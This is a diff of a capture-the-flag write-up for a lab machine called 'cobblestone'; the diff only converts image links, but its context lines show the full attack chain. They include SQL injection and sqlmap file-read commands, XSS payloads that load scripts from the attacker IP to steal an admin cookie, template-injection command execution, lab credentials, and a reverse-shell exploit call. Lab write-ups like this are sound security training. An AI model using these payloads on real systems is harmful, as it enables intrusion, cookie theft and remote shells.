@@ -22,7 +22,7 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-server-header: Apache/2.4.62 (Debian)
 Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-![[Pasted image 20260402085544.png]]
+![Pasted image 20260402085544](../Attachments/Pasted%20image%2020260402085544.png)
 
 - Clicking on the 3 links lead to 3 addresses:
 ```
@@ -33,19 +33,19 @@ http://cobblestone.htb/login.php
 - Adding the first 2 to /etc/hosts
 - I get the following sites:
 - Deply:
-![[Pasted image 20260402085817.png]]
+![Pasted image 20260402085817](../Attachments/Pasted%20image%2020260402085817.png)
 - Login
-![[Pasted image 20260402085833.png]]
+![Pasted image 20260402085833](../Attachments/Pasted%20image%2020260402085833.png)
 
 - Vote:
-![[Pasted image 20260402085918.png]]
+![Pasted image 20260402085918](../Attachments/Pasted%20image%2020260402085918.png)
 
 - I register a test user :`test:test`
 
-![[Pasted image 20260402090204.png]]
+![Pasted image 20260402090204](../Attachments/Pasted%20image%2020260402090204.png)
 
 - I can then login which leads me to the voting page:
-![[Pasted image 20260402090431.png]]
+![Pasted image 20260402090431](../Attachments/Pasted%20image%2020260402090431.png)
 
 - We can suggest a server :
 	- Inititally I tried my Ip and just `http://test` and it just responds with a Approved:false message.
@@ -102,16 +102,16 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 url=test' UNION SELECT 1,2,3,load_file('/etc/apache2/sites-enabled/000-default.conf'),5-- -
 ```
 
-![[Pasted image 20260402184147.png]]
+![Pasted image 20260402184147](../Attachments/Pasted%20image%2020260402184147.png)
 ```
 Suggestion #1 - RewriteEngine On RewriteCond %{HTTP_HOST} !^cobblestone.htb$ RewriteRule /.* http://cobblestone.htb/ [R] ServerName 127.0.0.1 ProxyPass "/cobbler_api" "http://127.0.0.1:25151/" ProxyPassReverse "/cobbler_api" "http://127.0.0.1:25151/" ServerName cobblestone.htb ServerAdmin cobble@cobblestone.htb DocumentRoot /var/www/html AAHatName cobblestone ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined RewriteEngine On RewriteCond %{HTTP_HOST} !^cobblestone.htb$ RewriteRule /.* http://cobblestone.htb/ [R] Alias /cobbler /srv/www/cobbler Options Indexes FollowSymLinks AllowOverride None Require all granted ServerName deploy.cobblestone.htb ServerAdmin cobble@cobblestone.htb DocumentRoot /var/www/deploy RewriteEngine On RewriteCond %{HTTP_HOST} !^deploy.cobblestone.htb$ RewriteRule /.* http://deploy.cobblestone.htb/ [R] ServerName vote.cobblestone.htb ServerAdmin cobble@cobblestone.htb DocumentRoot /var/www/vote RewriteEngine On RewriteCond %{HTTP_HOST} !^vote.cobblestone.htb$ RewriteRule /.* http://vote.cobblestone.htb/ [R] 
 ```
 - I see the web root is `/var/www/vote`
 - Furthermore analyzing packets from burp suite I see an interesting link : https://bybilly.uk
-![[Pasted image 20260409084119.png]]
+![Pasted image 20260409084119](../Attachments/Pasted%20image%2020260409084119.png)
 
 - ONe of the projects shows the same template:
-![[Pasted image 20260409084221.png]]
+![Pasted image 20260409084221](../Attachments/Pasted%20image%2020260409084221.png)
 
 - The source leads to this link : https://github.com/bybilly/minecraft-web-portal
 
@@ -127,12 +127,12 @@ Suggestion #1 - prepare("SELECT * FROM skins"); $stmt->execute(); $stmt->bind_re
 ```
 sqlmap -r req --batch --file-read /var/www/html/skins.php
 ```
-![[Pasted image 20260505064707.png]]
+![Pasted image 20260505064707](../Attachments/Pasted%20image%2020260505064707.png)
 - we see a db connection is made and via sqlmap that its a db/connection.php path. I initially tried `/var/www/html/db/connection.php` butit said connection failed. I had checked my user 
 ```
 url=-9999' UNION ALL SELECT 1,2,3,user(),5-- -
 ```
-![[Pasted image 20260505064835.png]]
+![Pasted image 20260505064835](../Attachments/Pasted%20image%2020260505064835.png)
 - As well as from default config earlier we know its vote. SOo I check it via the vote path:
 ```
 sqlmap -r req --batch --file-read /var/www/vote/db/connection.php
@@ -208,7 +208,7 @@ if ($conn->connect_errno > 0) {
 
 - We get some credentials : `voteuser`:`thaixu6eih0Iicho]irahvoh6aigh>ie`
 - in the skins page there is a suggest skin tab where we could set our server and file name that it downloads a skin.
-![[Pasted image 20260505065348.png]]
+![Pasted image 20260505065348](../Attachments/Pasted%20image%2020260505065348.png)
 
 - I search for suggest_skin.php in the sqli (first online and then via sqlmap to check the contents)
 ```
@@ -326,11 +326,11 @@ python3 -m http.server 4444
 ```
 <img src=x onerror="var s=document.createElement('script');s.src='http://10.10.16.126/works.js';document.body.appendChild(s)">
 ```
-![[Pasted image 20260506123057.png]]
+![Pasted image 20260506123057](../Attachments/Pasted%20image%2020260506123057.png)
 
 - We get a response:
-![[Pasted image 20260506123120.png]]
-![[Pasted image 20260506123144.png]]
+![Pasted image 20260506123120](../Attachments/Pasted%20image%2020260506123120.png)
+![Pasted image 20260506123144](../Attachments/Pasted%20image%2020260506123144.png)
 
 - Lets try to read skins.php:
 ```
@@ -425,7 +425,7 @@ echo "IHlldCBpbXBsZW1lbnRlZCcpIj5EZWNsaW5lPC9idXR0b24+CiAgICAgICAgPC90ZD4KICAgID
     <script src="js/                                
 ```
 
-![[Pasted image 20260506123653.png]]
+![Pasted image 20260506123653](../Attachments/Pasted%20image%2020260506123653.png)
 
 - In here we can see our cookie.
 - We can grab the cookie of the admin by accessing this page via the xss payload
@@ -449,17 +449,17 @@ cat steal.js
 ```
 
 - We call it via our exploit and get the cookie as a response:
-![[Pasted image 20260506141121.png]]
+![Pasted image 20260506141121](../Attachments/Pasted%20image%2020260506141121.png)
 - we get the cookie : `skqkk77dgr5q8crb22njue9koa`
 - We copy it into the cookies of our session at `cobblestone.htb`
-![[Pasted image 20260506135004.png]]
+![Pasted image 20260506135004](../Attachments/Pasted%20image%2020260506135004.png)
 
 - We refresh the page:
-![[Pasted image 20260506135033.png]]
+![Pasted image 20260506135033](../Attachments/Pasted%20image%2020260506135033.png)
 
 - we are at the admin panel and can go to UserManagement. With burpsuite or just analysing the network with inspecter we see a call to preview_banner.php when we click the preview button:
-![[Pasted image 20260506135237.png]]
-![[Pasted image 20260506135328.png]]
+![Pasted image 20260506135237](../Attachments/Pasted%20image%2020260506135237.png)
+![Pasted image 20260506135328](../Attachments/Pasted%20image%2020260506135328.png)
 
 - I change the input to a basic payload test and i see the user is www-data:
 ```
@@ -479,7 +479,7 @@ Priority: u=0
 
 first={{['whoami']|map('system')|join}}"
 ```
-![[Pasted image 20260506135948.png]]
+![Pasted image 20260506135948](../Attachments/Pasted%20image%2020260506135948.png)
 
 
 - Alternatively Create a test payload to test some endpoints `xsstest.js` with the target to be previwe_banner.php:
@@ -506,7 +506,7 @@ first={{['whoami']|map('system')|join}}"
 ```
 <img src=x onerror="var s=document.createElement('script');s.src='http://10.10.16.126/xsstest.js';document.body.appendChild(s)">
 ```
-![[Pasted image 20260506112427.png]]
+![Pasted image 20260506112427](../Attachments/Pasted%20image%2020260506112427.png)
 - It returns a base64 value to my python srver posted at port 4444:
 ```
 python3 -m http.server 4444
@@ -514,15 +514,15 @@ Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
 10.129.48.200 - - [06/May/2026 11:19:08] "GET /?i=0&r=PGgxIGNsYXNzPSJ0ZXh0LWxpZ2h0IGRpc3BsYXktMyI+V2VsY29tZSB3d3ctZGF0YQp3d3ctZGF0YTwvaDE+ HTTP/1.1" 200 -
 
 ```
-![[Pasted image 20260506112603.png]]
-![[Pasted image 20260506112452.png]]
+![Pasted image 20260506112603](../Attachments/Pasted%20image%2020260506112603.png)
+![Pasted image 20260506112452](../Attachments/Pasted%20image%2020260506112452.png)
 - Decoding it gives us the response `www-data`
 ```
 echo "PGgxIGNsYXNzPSJ0ZXh0LWxpZ2h0IGRpc3BsYXktMyI+V2VsY29tZSB3d3ctZGF0YQp3d3ctZGF0YTwvaDE+" | base64 -d
 <h1 class="text-light display-3">Welcome www-data
 www-data</h1> 
 ```
-![[Pasted image 20260506112653.png]]
+![Pasted image 20260506112653](../Attachments/Pasted%20image%2020260506112653.png)
 - We could dump sql creds here but we have voteuser creds only. We could search for the creds for this database user via the html path:
 ```
 sqlmap -r req --batch --file-read /var/www/html/db/connection.php
@@ -576,8 +576,8 @@ files saved to [1]:
 
 [*] ending @ 14:49:32 /2026-05-06/
 ```
-![[Pasted image 20260506145014.png]]
-![[Pasted image 20260506145028.png]]
+![Pasted image 20260506145014](../Attachments/Pasted%20image%2020260506145014.png)
+![Pasted image 20260506145028](../Attachments/Pasted%20image%2020260506145028.png)
 
 - Reading the file I get another set of credentials for `dbuser`:`aichooDeeYanaekungei9rogi0eMuo2o`
 ```
@@ -625,12 +625,12 @@ cat xploit.js
 ```
 <img src=x onerror="var s=document.createElement('script');s.src='http://10.10.16.126/xploit.js';document.body.appendChild(s)">
 ```
-![[Pasted image 20260506145233.png]]
+![Pasted image 20260506145233](../Attachments/Pasted%20image%2020260506145233.png)
 
 
 - It downloads and we get a response:
-![[Pasted image 20260506145341.png]]
-![[Pasted image 20260506145325.png]]
+![Pasted image 20260506145341](../Attachments/Pasted%20image%2020260506145341.png)
+![Pasted image 20260506145325](../Attachments/Pasted%20image%2020260506145325.png)
 ```
 python3 -m http.server 4444
 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
@@ -655,7 +655,7 @@ echo "OTssJiMwMzk7YWRtaW4mIzAzOTssJiMwMzk7YWRtaW4mIzAzOTssJiMwMzk7YWRtaW5AY29iYm
 /*!40000 A
 ```
 
-![[Pasted image 20260506114210.png]]
+![Pasted image 20260506114210](../Attachments/Pasted%20image%2020260506114210.png)
 - Alternatively we can get the outptu from burpsuite:
 ```
 POST /preview_banner.php HTTP/1.1
@@ -674,7 +674,7 @@ Priority: u=0
 
 first={{['mysqldump+-h127.0.0.1+-udbuser+-paichooDeeYanaekungei9rogi0eMuo2o+cobblestone+users']|map('system')|join}}"
 ```
-![[Pasted image 20260506141354.png]]
+![Pasted image 20260506141354](../Attachments/Pasted%20image%2020260506141354.png)
 
 
 - Alternatively can decode everythign with python:
@@ -767,14 +767,14 @@ commit;
 
 
 - Using crackstation (or hashcat 1400) I crack cobble's hash to be `iluvdannymorethanyouknow`
-![[Pasted image 20260505093108.png]]
+![Pasted image 20260505093108](../Attachments/Pasted%20image%2020260505093108.png)
 
 - I can ssh into target but commadns dont work..atleast the ones we know:
 ```
 ssh cobble@cobblestone.htb
 > iluvdannymorethanyouknow
 ```
-![[Pasted image 20260505093243.png]]
+![Pasted image 20260505093243](../Attachments/Pasted%20image%2020260505093243.png)
 
 - However we are able to list and read files so we can read user.txt:
 ```
@@ -782,14 +782,14 @@ pwd
 ls
 cat user.txt
 ```
-![[Pasted image 20260505093425.png]]
+![Pasted image 20260505093425](../Attachments/Pasted%20image%2020260505093425.png)
 
 - It seems to be a restricted shell:
-![[Pasted image 20260505095413.png]]
+![Pasted image 20260505095413](../Attachments/Pasted%20image%2020260505095413.png)
 
 - Remembering the info from 000-default conf it spoke of an api cobbler-api at `http://127.0.0.1:25151`
 - Also using `ss` we can see its opne:
-![[Pasted image 20260505100353.png]]
+![Pasted image 20260505100353](../Attachments/Pasted%20image%2020260505100353.png)
 - We can do a port forwarding via ssh:
 ```
 ssh -L 25151:127.0.0.1:25151 cobble@cobblestone.htb    
@@ -1107,12 +1107,12 @@ except Exception as e:
 ```
 python3 exploit.py
 ```
-![[Pasted image 20260505104316.png]]
+![Pasted image 20260505104316](../Attachments/Pasted%20image%2020260505104316.png)
 
-![[Pasted image 20260505104302.png]]
+![Pasted image 20260505104302](../Attachments/Pasted%20image%2020260505104302.png)
 
 - I get the root flag:
-![[Pasted image 20260505104338.png]]
+![Pasted image 20260505104338](../Attachments/Pasted%20image%2020260505104338.png)
 
 - (probably intended) Another vulnerability for code execution is in the background_imports function:
 https://github.com/cobbler/cobbler/issues/1329
@@ -1193,7 +1193,7 @@ if __name__ == "__main__":
 python3 exploit2.py -t http://127.0.0.1:25151 -l 10.10.16.126 -p 9001 --payload bash
 ```
 
-![[Pasted image 20260506143143.png]]
+![Pasted image 20260506143143](../Attachments/Pasted%20image%2020260506143143.png)
 
 ----
 ### Added/Extra Notes
@@ -1273,9 +1273,9 @@ Cobbler API Auto Install
 The Cobbler API supports various auto-installation methods, including AutoYaST, Kickstart, Preseed, and Cloud-Init. These methods allow for automated installations of SUSE and openSUSE systems, as well as Debian and Ubuntu systems. Cobbler provides a built-in script called "Anamon" for sending client-side installation logs back to the Cobbler server. The API also supports templating for advanced functions, allowing for the customization of automatic installation files. For more detailed information, users can refer to the Cobbler documentation and GitHub issues page.
 - In a few minutes we will see both the download and the response:
 - Download:
-![[Pasted image 20260505092426.png]]
+![Pasted image 20260505092426](../Attachments/Pasted%20image%2020260505092426.png)
 - Response:
-![[Pasted image 20260505092443.png]]
+![Pasted image 20260505092443](../Attachments/Pasted%20image%2020260505092443.png)
 ```
 
 ```
@@ -1304,9 +1304,9 @@ Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
 ## Checking preview_banner.php endpoint is valid 
 - In a few minutes we will see both the download and the response:
 - Download:
-![[Pasted image 20260505092426.png]]
+![Pasted image 20260505092426](../Attachments/Pasted%20image%2020260505092426.png)
 - Response:
-![[Pasted image 20260505092443.png]]
+![Pasted image 20260505092443](../Attachments/Pasted%20image%2020260505092443.png)
 ```
 python3 -m http.server 4444
 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
